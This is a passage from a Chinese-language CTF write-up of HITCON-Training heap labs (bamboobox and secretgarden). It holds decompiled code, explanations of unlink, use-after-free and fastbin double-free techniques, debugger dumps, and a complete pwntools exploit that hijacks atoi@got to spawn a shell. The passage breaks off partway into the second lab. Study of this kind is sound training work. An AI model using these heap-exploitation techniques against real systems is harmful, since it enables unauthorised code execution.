class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-2Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the index of item:\"</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v2 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the length of item name:\"</span>, &amp;buf);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">      v0 = atoi(&amp;nptr);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the new name of the item:\"</span>, &amp;nptr);</span><br><span class=\"line\">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] + (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)read(<span class=\"number\">0</span>, *(<span class=\"keyword\">void</span> **)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>], v0)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"invaild index\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No item in the box\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该题也是采用全局变量管理堆块指针，将申请chunk的size和对应指针依次存放在bss段。也就是说，如果我们能够修改bss段的指向chunk的指针为任意地址，我们也就可以利用show和edit函数实现任意地址读写。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>根据上述分析，要实现bss段修改，结合该题的堆溢出漏洞，构造一个unlink利用来使得bss段上的chunk指针向前移动0x18个byte，然后修改chunk指针，实现任意地址读写，从而leak处libc，再劫持atoi@got（malloc_hook和free_hook似乎也可以）为one_gadget从而getshell。</p>\n<p>注意unlink利用有如下要点：</p>\n<ul>\n<li>需要在free时触发前向或后向合并，条件有：<ul>\n<li>free的堆块位于unsorted bin范围内（64位最小为0x80）</li>\n<li>free的堆块的前一个或后一个堆块未被使用（被free），这根据当前chunk的prev_inuse位判断，并且需要构造prev_size，在当前chunk的地址 - prev_size的位置布置一个fake chunk</li>\n<li>fake chunk需要保证fake chunk的next chunk的prev_size和自己的size相同</li>\n</ul>\n</li>\n<li>野指针需要指向被合并的fake chunk的user_data区间，然后从user_data部分开始构造fake chunk</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">itemlist = <span class=\"number\">0x6020c0</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span></span><br><span class=\"line\"></span><br><span class=\"line\">ptr = itemlist + <span class=\"number\">0x8</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x61</span>) + p64(ptr - <span class=\"number\">0x18</span>) + p64(ptr - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">0x60</span> - <span class=\"number\">0x20</span>) * <span class=\"string\">\"a\"</span> + p64(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0xa0</span>) + p64(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"><span class=\"comment\"># now ptr = 0x6020b0</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(atoi_got)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(one_gadget + libc.address)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"any\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab12——secretgarden\"><a href=\"#Lab12——secretgarden\" class=\"headerlink\" title=\"Lab12——secretgarden\"></a>Lab12——secretgarden</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>和Lab11类似，也没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab12$ checksec secretgarden</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>主要功能有add, visit, del和clean。</p>\n<h4 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h4><p>这里我们通过逆向得到flower结构体的结构为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct flower&#123;</span><br><span class=\"line\">\t+0x0 DWORD inuse; // 初始化之后会置为1</span><br><span class=\"line\">  +0x8 char* name;</span><br><span class=\"line\">  +0x10 char[24] color; // 通过scanf（&quot;%23s&quot;）输入，说明至少为23位</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>add函数中，首先判断flowercount是否大于0x63，是则直接退出。然后malloc一个0x28的chunk，并均初始化为0。然后用scanf读入name的长度，这里检查长度size不为-1，防止整数溢出。然后malloc(size)的chunk，再读入name和color。最后会存储在flowerlist上，并将flowercount自增1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v0; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> size; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *s; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  s = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  buf = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  LODWORD(size) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)flowercount &gt; <span class=\"number\">0x63</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"The garden is overflow\"</span>);</span><br><span class=\"line\">  s = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Length of the name :\"</span>, <span class=\"number\">0L</span>L, size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)__isoc99_scanf(<span class=\"string\">\"%u\"</span>, &amp;size) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  buf = <span class=\"built_in\">malloc</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Alloca error !!\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The name of flower :\"</span>, size);</span><br><span class=\"line\">  v0 = buf;</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  *((_QWORD *)s + <span class=\"number\">1</span>) = buf;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The color of the flower :\"</span>, v0, size);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%23s\"</span>, (<span class=\"keyword\">char</span> *)s + <span class=\"number\">16</span>);</span><br><span class=\"line\">  *(_DWORD *)s = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( HIDWORD(size) = <span class=\"number\">0</span>; HIDWORD(size) &lt;= <span class=\"number\">0x63</span>; ++HIDWORD(size) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;flowerlist + HIDWORD(size)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(&amp;flowerlist + HIDWORD(size)) = s;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ++flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful !\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h4><p>会根据输入的index，将对应flowerlist中的flower结构体的inuse置为0，然后free掉name的chunk，注意这里存在uaf漏洞，而且没有free flower结构体堆块</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">del</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !flowercount )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Which flower do you want to remove from the garden:\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt;= <span class=\"number\">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)*(&amp;flowerlist + v1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)*(&amp;flowerlist + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid choice\"</span>);</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"clean\"><a href=\"#clean\" class=\"headerlink\" title=\"clean\"></a>clean</h4><p>判断对应flower的chunk不为null且inuse标记为0，就free掉flower结构体，然后将flowercount自减1。也就是说，这个函数没有free flower的name的堆块。理论上应该先调用del，再调用clean。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">clean</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;flowerlist + i) &amp;&amp; !*(_DWORD *)*(&amp;flowerlist + i) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(*(&amp;flowerlist + i));</span><br><span class=\"line\">      *(&amp;flowerlist + i) = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">      --flowercount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"visit\"><a href=\"#visit\" class=\"headerlink\" title=\"visit\"></a>visit</h4><p>根据对应flowerlist上对应chunk的inuse位，若inuse位不为0，则输出name和color。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">visit</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  LODWORD(v0) = flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( flowercount )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = (__int64)*(&amp;flowerlist + i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v0 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = *(_DWORD *)*(&amp;flowerlist + i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (_DWORD)v0 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name of the flower[%u] :%s\\n\"</span>, i, *((_QWORD *)*(&amp;flowerlist + i) + <span class=\"number\">1</span>));</span><br><span class=\"line\">          LODWORD(v0) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Color of the flower[%u] :%s\\n\"</span>, i, (<span class=\"keyword\">char</span> *)*(&amp;flowerlist + i) + <span class=\"number\">16</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>该题目程序功能比较复杂，但是主要漏洞在于对堆块是否被释放的管理逻辑有误。del函数会将指定index的chunk的<em>inuse置0</em>，并且将对应的name chunk free掉，但是没有free 指定index的chunk本身。clean函数会将所有inuse位不为0且不为null的chunk free掉。而visit函数会根据inuse位是否为1来决定是否输出对应信息。</p>\n<p>注意，该题由于没有setvbuf，所以需要先调用一次add函数将缓冲区申请出来。</p>\n<p>注意到，该题在调用del之后，如果不调用clean，将不会从全局数组上删除对应chunk指针，所以存在潜在的double free漏洞。在此构造一个fastbin 2free，实现任意地址分配。</p>\n<p>一般来说，通过inuse这种方式判断是否可以free是不安全的，一般都可能存在2free漏洞。</p>\n<p>这里要实现任意地址分配，需要控制size。我们需要在想改的got表覆盖找一个地址，size在fastbin范围内，在got表前面一个byte一个byte的查看字节偏移，找到0x601fffa为合适的地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x601ffa</span><br><span class=\"line\">0x601ffa:\t0x1e28000000000000\t0x0168000000000060</span><br><span class=\"line\">0x60200a:\t0x0ee000007fd5662b\t0x34f000007fd5660a</span><br><span class=\"line\">0x60201a &lt;free@got.plt+2&gt;:\t0xe69000007fd565d4\t0x07b600007fd565d2</span><br><span class=\"line\">0x60202a &lt;__stack_chk_fail@got.plt+2&gt;:\t0x4800000000000040\t0x197000007fd565d1</span><br><span class=\"line\">0x60203a &lt;memset@got.plt+2&gt;:\t0xb20000007fd565e3\t0x68e000007fd565d8</span><br><span class=\"line\">0x60204a &lt;close@got.plt+2&gt;:\t0x625000007fd565db\t0xf74000007fd565db</span><br><span class=\"line\">0x60205a &lt;__libc_start_main@got.plt+2&gt;:\t0x43c000007fd565cd\t0x313000007fd565cf</span><br><span class=\"line\">0x60206a 